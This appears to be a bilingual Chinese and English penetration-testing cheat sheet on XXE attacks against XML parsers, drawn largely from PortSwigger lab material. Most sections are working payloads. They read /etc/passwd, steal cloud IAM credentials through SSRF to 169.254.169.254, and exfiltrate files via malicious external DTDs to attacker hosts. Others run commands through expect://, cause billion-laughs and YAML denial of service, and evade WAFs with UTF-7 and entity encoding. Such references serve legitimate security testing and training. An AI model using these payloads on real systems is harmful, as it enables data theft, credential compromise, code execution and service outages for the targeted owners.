# XXE - XEE - XML External Entity

XML 外部实体攻击是针对解析 XML 输入的应用程序的一种攻击。

## XML Basics

**Most of this part was taken from this amazing Portswigger page:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### 什么是 XML? <a href="#what-is-xml" id="what-is-xml"></a>

XML 代表“可扩展标记语言”。 XML 是一种设计用于存储和传输数据的语言。与 HTML 一样，XML 使用标签和数据的树状结构。与 HTML 不同，XML 不使用预定义的标签，因此可以为标签指定描述数据的名称。在 Web 历史的早期，XML 作为一种数据传输格式很流行（“AJAX”中的“X”代表“XML”）。 但它的受欢迎程度现在已经下降，后继者为JSON。.

### 什么是实体? <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>

XML 实体是一种在 XML 文档中表示数据项的方式，而不是使用数据本身。 XML 语言的规范中内置了各种实体。例如，实体 `&lt;` 和 `&gt;` 表示字符 `<` 和 `>`。这些是用于表示 XML 标记的元字符（类似编程语言中的关键字），因此当它们出现在数据中时，通常必须使用它们的实体来表示。

#### 实体类型
1. 字符实体
   1. 预定义字符实体
   2. 编号字符实体
   3. 命名字符实体
2. 内部实体（又称：命名实体）
3. 外部实体
4. 参数实体
   1. 外部参数实体
   2. 内部参数实体


#### 理解实体
1. **字符实体：** 字符实体，我们可以用十进制格式（&#nnn;，其中 nnn 是字符的十进制值）或十六进制格式（&#xhhh;，其中hhh 是字符的十六进制值）来指定任意 Unicode 字符。其中上面提及的 *“实体 `&lt;` 和 `&gt;` 表示字符 `<` 和 `>`”* 就是字符实体中预定义字符实体的一种。
2. **内部实体：** 命名实体（在 XML 规范中也称为内部实体）就是我们在谈论 “实体” 时所指的实体。命名实体在 DTD 或内部子集（即文档中 <!DOCTYPE> 语句的一部分）中声明，在文档中用作引用。在 XML 文档解析过程中，实体引用将由它的表示替代。
3. **外部实体：** 外部实体表示外部文件的内容。外部实体在有些情况下很有用，比如说，您在创建一本图书并且想将每一章存储为一个单独的文件。
4. **参数实体：** 参数实体用 `% name` 申明，引用时用 `%name;` ，只能在DTD中申明，DTD中引用。其余实体直接用 name 申明，引用时用 `&name;`，只能在 DTD 中申明，可在xml文档中引用


### 什么是 elements?

元素类型声明为 XML 文档中可能出现的元素的类型和数量、哪些元素可能出现在彼此内部以及它们必须出现的顺序设置了规则。例如：

* `<!ELEMENT stockCheck ANY>` 表示父元素中可以插入任意对象 `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck EMPTY> 表示应该为空 `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck (productId,storeId)> 声明 `<stockCheck>` 应有两个子元素 `<productId>` 和 `<storeId>`

### 什么是文档类型定义（DTD）? <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>

XML 文档类型定义 (DTD) 包含可以定义 XML 文档的结构、它可以包含的数据值的类型以及其他项的声明。 DTD 在 XML 文档开头的可选 `DOCTYPE` 元素中声明。 DTD 可以完全独立于文档本身（称为“内部 DTD”），也可以从其他地方加载（称为“外部 DTD”），也可以是两者的混合。

### 什么是 XML 自定义实体 ? <a href="#what-are-xml- custom-entities" id="what-are-xml-custom-entities"></a>

XML 允许在 DTD 中定义自定义实体。例如：

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

此定义意味着在 XML 文档中对实体引用 `&myentity;` 的任何使用都将替换为定义的值：“`my entity value`”。

### 什么是 XML 外部实体? <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>

XML 外部实体是一种自定义实体，其定义位于声明它们的 DTD 之外。

外部实体的声明使用 `SYSTEM` 关键字，并且必须指定应从其加载实体值的 URL。例如：

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

The URL can use the `file://` protocol, and so external entities can be loaded from file. For example:

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

XML external entities provide the primary means by which [XML external entity attacks](https://portswigger.net/web-security/xxe) arise.

### 什么是 XML 参数实体?


有时，由于应用程序的某些输入验证或正在使用的 XML 解析器的某些强化，使用常规实体的 XXE 攻击会被阻止。在这种情况下，您可以改用 XML 参数实体。 XML 参数实体是一种特殊的 XML 实体，只能在 DTD 的其他地方引用。就目前而言，您只需要知道两件事。首先，XML 参数实体的声明包括实体名称前的百分号字符：

`<!ENTITY % myparameterentity "my parameter entity value" >`

其次，使用百分比字符而不是通常的 & 符号来引用参数实体：`%myparameterentity;`

这意味着您可以通过 XML 参数实体使用带外检测来测试盲 XXE，如下所示：

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

这个 XXE 有效负载声明了一个名为“xxe”的 XML 参数实体，然后使用 DTD 中的实体。这将导致对攻击者域的 DNS 查找和 HTTP 请求，验证攻击是否成功。

## 主要攻击

[Most of these attacks were tested using the awesome Portswiggers XEE labs: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

### 实体测试

在这次攻击中，我将测试一个简单的实体声明是否有效

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
    <productId>&toreplace;</productId>
    <storeId>1</storeId>
</stockCheck>
```

![](<../.gitbook/assets/image (220).png>)

### 读文件

让我们尝试以不同的方式读取 `/etc/passwd`。对于 Windows，您可以尝试阅读：`C:\windows\system32\drivers\etc\hosts`

在第一种情况下，请注意 SYSTEM "_**file:///**etc/passwd_" 也可以工作。
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

![](<../.gitbook/assets/image (221).png>)

如果 Web 服务器正在使用 PHP，则第二种情况对于提取文件应该很有用（Portswiggers 实验室的情况除外）

```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```

在这第三种情况下，我们将 `Element stockCheck` 声明为 ANY

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&file;</productId>
    <storeId>1</storeId>
</stockCheck3>
```

![](<../.gitbook/assets/image (222).png>)

### 目录内容罗列

在基于 **java**的应用程序中，可能可以通过 XXE **列出目录的内容**，其有效负载如下：

```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```

### SSRF

XXE 可用于云服务器的 SSRF

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Blind SSRF

使用**上面的技术**，您可以使服务器访问您控制的服务器以显示其易受攻击。但是，如果这不起作用，可能是因为 **XML 实体不允许**，在这种情况下，您可以尝试使用 **XML 参数实体**：

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

### "Blind" SSRF - 带外泄露数据

**在这种情况下，我们将让服务器加载一个带有恶意负载的新 DTD，该负载将通过 HTTP 请求发送文件的内容（对于多行文件，您可以尝试通过**_**ftp://**_**协议泄露数据)。此解释取自**[**Portswiggers lab here**](https://portswigger.net/web-security/xxe/blind) **。**

一个恶意 DTD 泄露 `/etc/hostname` 文件内容的示例如下：

```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

This DTD carries out the following steps:

* 定义一个名为 `file` 的 XML 参数实体，包含 `/etc/passwd` 文件的内容。
* 定义一个名为“eval”的 XML 参数实体，其中包含另一个名为“exfiltrate”的 XML 参数实体的动态声明。 `exfiltrate` 实体将通过向攻击者的 Web 服务器发出 HTTP 请求来评估，该请求包含 URL 查询字符串中的 `file` 实体的值。
* 使用 `eval` 实体，这会导致执行 `exfiltrate` 实体的动态声明。
* 使用 `exfiltrate` 实体，以便通过请求指定的 URL 来评估其值。

然后，攻击者必须将恶意 DTD 托管在他们控制的系统上，通常是将其加载到他们自己的网络服务器上。例如，攻击者可能会在以下 URL 提供恶意 DTD：\
`http://web-attacker.com/malicious.dtd`

最后，攻击者必须向易受攻击的应用程序提交以下 XXE 有效负载：

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

这个 XXE 有效负载声明了一个名为“xxe”的 XML 参数实体，然后使用 DTD 中的实体。这将导致 XML 解析器从攻击者的服务器获取外部 DTD 并内联解释它。然后执行恶意 DTD 中定义的步骤，并将 `/etc/passwd` 文件传输到攻击者的服务器。

### 基于错误 XXE 攻击(外部 DTD)

**在这种情况下，我们将让服务器加载一个恶意 DTD，该 DTD 将在错误消息中显示文件的内容（这仅在您可以看到错误消息时才有效）。** [**Example from here.**](https://portswigger.net/web-security/xxe/blind)

您可以使用恶意外部 DTD 触发包含 `/etc/passwd` 文件内容的 XML 解析错误消息，如下所示：

```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

此 DTD 执行以下步骤：

* 定义一个名为 `file` 的 XML 参数实体，包含 `/etc/passwd` 文件的内容。
* 定义一个名为 `eval` 的 XML 参数实体，其中包含另一个名为 `error` 的 XML 参数实体的动态声明。 `error` 实体将加载一个不存在的文件，该文件的名称包含 `file` 实体的值。
* 使用 `eval` 实体，这会导致执行 `error` 实体的动态声明。
* 使用 `error` 实体，尝试加载不存在的文件，从而导致错误消息包含不存在文件的名称，即 `/etc/passwd` 文件的内容。

调用外部 DTD 错误：

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

您应该会在 Web 服务器响应的错误消息中看到文件的内容。
![](<../.gitbook/assets/image (223).png>)

_**上述技术适用于外部 DTD，但通常不适用于在DOCTYPE元素中完全指定的内部 DTD。这是因为该技术涉及`在一个参数实体的定义中使用 XML 参数实体`。根据 XML 规范，这在外部 DTD 中是允许的，但在内部 DTD 中是不允许的。（一些解析器可能会兼容这种错误，但许多解析器不会。）**_

### **基于错误的 XXE 攻击 (系统内置 DTD)**

当 **out-of-band interactions are blocked**（即无法外联的情况），但 blind XXE 存在的情况应该如何处置？ [相关资料](https://portswigger.net/web-security/xxe/blind)。

在这种情况下，由于 XML 语言规范中的漏洞，仍然可能**触发包含敏感数据的错误消息**。如果文档的**DTD 混合使用内部和外部DTD**声明，则**内部DTD 可以重新定义在外部DTD**中声明的实体。发生这种情况时，对`在一个参数实体的定义中使用 XML 参数实体`的限制就会放宽。


这意味着攻击者可以在内部 DTD 中使用**基于错误的 XXE 技术**，前提是他们使用的 XML 参数实体是**重新定义在外部 DTD 中声明的实体**。当然，如果带外连接被阻止，则无法从远程位置加载外部 DTD。相反，它需要是一个**应用程序服务器本地的外部 DTD 文件**。 _从本质上讲，攻击涉及调用恰好存在于本地文件系统上的 DTD 文件，并重新利用它来重新定义现有实体，从而触发包含敏感数据的解析错误。_

例如，假设在服务器文件系统的“/usr/local/app/schema.dtd”位置有一个 DTD 文件，该 DTD 文件定义了一个名为“custom_entity”的实体。攻击者可以通过提交如下所示的混合 DTD 来触发包含 `/etc/passwd` 文件内容的 XML 解析错误消息：

```markup
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
    <!ENTITY % custom_entity '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
```

此 DTD 执行以下步骤：

* 定义一个名为 `local_dtd` 的 XML 参数实体，包含存在于服务器文件系统上的外部 DTD 文件的内容。
* 重新定义名为“custom_entity”的 XML 参数实体，该实体已在外部 DTD 文件中定义。该实体被重新定义为包含 [基于错误的 XXE 漏洞利用](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)已经描述过，用于触发包含 `/etc/passwd` 文件内容的错误消息。
* 使用 `local_dtd` 实体，以便解释外部 DTD，包括 `custom_entity` 实体的重新定义值。这会产生所需的错误消息。

**真实示例：** 使用 GNOME 桌面环境的系统通常在 `/usr/share/yelp/dtd/docbookx.dtd` 有一个 DTD，其中包含一个名为 `ISOamso` 的实体

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

![](<../.gitbook/assets/image (224).png>)

由于此技术使用**内部 DTD，因此您需要先找到一个有效的 DTD**。您可以这样做**安装**服务器正在使用的相同**OS/软件**并**搜索一些默认DTD**，或**获取系统内**默认DTD**的列表**和**检查**是否存在：

```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

### 定位系统内置的 DTD 文件

可在以下 github 存储库中，您可以找到**系统中可能存在的 DTD 路径**：

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

如果拥有与目标系统同一个 Docker 镜像文件，可以尝试使用下面的工具在该镜像内找到内置的 DTD 文件：[Readme of the github](https://github.com/GoSecure/dtd-finder) 

```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

 [=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

 [=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```

### XXE via Office Open XML Parsers

（复制自 [**here**](https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/)）\
许多 Web 应用程序允许您上传 Microsoft Office 文档，然后它们会从中解析出一些细节。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要**解析至少一个 XML 文件**。
对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 **Microsoft Office 文件**，所以让我们这样做。首先，创建一个空目录来解压你的文档，然后解压！

```
test$ ls
test.docx
test$ mkdir unzipped
test$ unzip ./test.docx -d ./unzipped/
Archive:  ./test.docx
  inflating: ./unzipped/word/numbering.xml
  inflating: ./unzipped/word/settings.xml
  inflating: ./unzipped/word/fontTable.xml
  inflating: ./unzipped/word/styles.xml
  inflating: ./unzipped/word/document.xml
  inflating: ./unzipped/word/_rels/document.xml.rels
  inflating: ./unzipped/_rels/.rels
  inflating: ./unzipped/word/theme/theme1.xml
  inflating: ./unzipped/[Content_Types].xml
```

在您喜欢的文本编辑器 (vim) 中打开 `./unzipped/word/document.xml` 并编辑 **XML 以包含您喜欢的 XXE 有效负载**。我尝试的第一件事往往是 HTTP 请求，如下所示：

```
<!DOCTYPE x [ <!ENTITY test SYSTEM "http://[ID].burpcollaborator.net/"> ]>
<x>&test;</x>
```

这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：

![Those lines should be inserted in between the two root XML objects, like thi](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png)

剩下的就是**压缩文件以创建恶意 poc.docx 文件**。从我们之前创建的“解压缩”目录中，运行以下命令：

![From the "unzipped" directory that we created earlier, run the following:](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png)

现在将文件上传到您的（希望如此）易受攻击的 Web 应用程序，并在 Burp Collaborator 日志中向黑客之神祈祷。

### Jar: protocol

`jar` 协议仅适用于 **Java 应用程序**。它允许访问 **PKZIP**文件（`.zip`、`.jar`、...）中的文件，并适用于本地和远程文件：

```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```

{% hint style="danger" %}
能够访问 PKZIP 文件中的文件对于通过系统 DTD 文件滥用 XXE 非常有用。**检查 [此部分以了解如何滥用系统 DTD 文件](xxe-xee-xml-external-entity.md#基于错误的系统-dtd）。
{% endhint %}

#### Behind the scenes

1. 它发出 HTTP 请求以加载 zip 存档。 `https://download.host.com/myarchive.zip`
2. 它将 HTTP 响应保存到一个临时位置。 `/tmp/...`
3. 它提取档案。
4. 它读取`file.zip`
5. 它删除临时文件。

请注意，可以在第二步中停止流程。诀窍是在提供文件时永远不要关闭连接。 [这个工具很有用](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution)：一个在python`slow_http_server.py`和一个在java`slowserver。罐子`。

一旦服务器下载了你的文件，你需要通过浏览临时目录来找到它的位置。由于是随机的，因此无法提前预测文件路径。
![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
在临时目录中写入文件有助于**升级另一个涉及路径遍历的漏洞**（例如本地文件包含、模板注入、XSLT RCE、反序列化等）。
{% endhint %}


### XSS

```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```

### DoS

#### Billion Laugh Attack

```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

#### Yaml Attack

```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

#### 二次爆炸攻击

![](<../.gitbook/assets/image (531).png>)

## Hidden XXE Surfaces

### XInclude

[From here.](https://portswigger.net/web-security/xxe)

一些应用程序**接收客户端提交的数据，在服务器端将其嵌入到 XML 文档中，然后解析文档**。当客户端提交的数据被放入一个**后端 SOAP 请求**，然后由后端 SOAP 服务处理时，就会出现这种情况。
在这种情况下，您无法执行经典的 XXE 攻击，因为**您无法控制整个 XML**文档，因此无法定义或修改 `DOCTYPE` 元素。但是，您也许可以使用 `XInclude` 代替。 `XInclude` 是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以在 XML 文档中的任何数据值中放置“XInclude”攻击，因此可以在您仅控制放置在服务器端 XML 文档中的单个数据项的情况下执行攻击。
要执行 `XInclude` 攻击，您需要引用 `XInclude` 命名空间并提供您希望包含的文件的路径。例如：

```markup
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

### SVG - File Upload

[From here.](https://portswigger.net/web-security/xxe)

一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用 XML 或包含 XML 子组件。基于 XML 的格式的示例有 DOCX 等办公文档格式和 SVG 等图像格式。
例如，应用程序可能允许用户**上传图像**，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收像 PNG 或 JPEG 这样的格式，**正在使用的图像处理库也可能支持 SVG 图像**。由于 SVG 格式使用 XML，攻击者可以提交恶意 SVG 图像，从而达到 XXE 漏洞的隐藏攻击面。
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```

You could also try to **execute commands** using the PHP "expect" wrapper:

```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

**注意读取文件或执行结果的第一行将出现在创建的图像内。因此，您需要能够访问 SVG 创建的图像。**

### **PDF - File upload**

Read the following post to **learn how to exploit a XXE uploading a PDF** file:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: From x-www-urlencoded to XML

如果 POST 请求接受 XML 格式的数据，您可以尝试在该请求中利用 XXE。例如，如果一个正常的请求包含以下内容：

```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Then you might be able submit the following request, with the same result:

```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

### Content-Type: From JSON to XEE

To change the request you could use a Burp Extension named “**Content Type Converter**“. [Here](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) you can find this example:

```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
  "firstName": "Avinash",
  "lastName": "",
  "country": "United States",
  "city": "ddd",
  "postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]> 
<root>
 <root>
  <firstName>&xxe;</firstName>
  <lastName/>
  <country>United States</country>
  <city>ddd</city>
  <postalCode>ddd</postalCode>
 </root>
</root>
```

Another example can be found [here](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & Protections Bypasses

### Base64

```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

This only work if the XML server accepts the `data://` protocol.

### UTF-7

You can use the \[**"Encode Recipe**" of cyberchef here ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transform to UTF-7.

```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

### File:/ Protocol Bypass

If the web is using PHP, instead of using `file:/` you can use **php wrappers**`php://filter/convert.base64-encode/resource=` to **access internal files**.

If the web is using Java you may check the [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

Trick from [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
You can create an **entity inside an entity** encoding it with **html entities** and then call it to **load a dtd**.\
Note that the **HTML Entities** used needs to be **numeric** (like \[in this example]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).

```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x64;&#x74;&#x64;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x20;&#x3E;" >%a;%dtd;]>
<data>
    <env>&exfil;</env>
</data>
```

DTD example:

```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```

## PHP Wrappers

### Base64

**Extract** _**index.php**_

```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```

#### **Extract external resource**

```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```

### Remote code execution

**If PHP "expect" module is loaded**

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

## **SOAP - XEE**

```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```

## XLIFF - XXE

This section was taken from [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)\
According to the [Wikipedia](https://en.wikipedia.org/wiki/XLIFF):

> XLIFF (XML Localization Interchange File Format) is an XML-based bitext format created to standardize the way localizable data are passed between and among tools during a localization process and a common format for CAT tool exchange.

### Blind request

```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```

The server response with an error:

```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```

But we got a hit on Burp Collaborator.

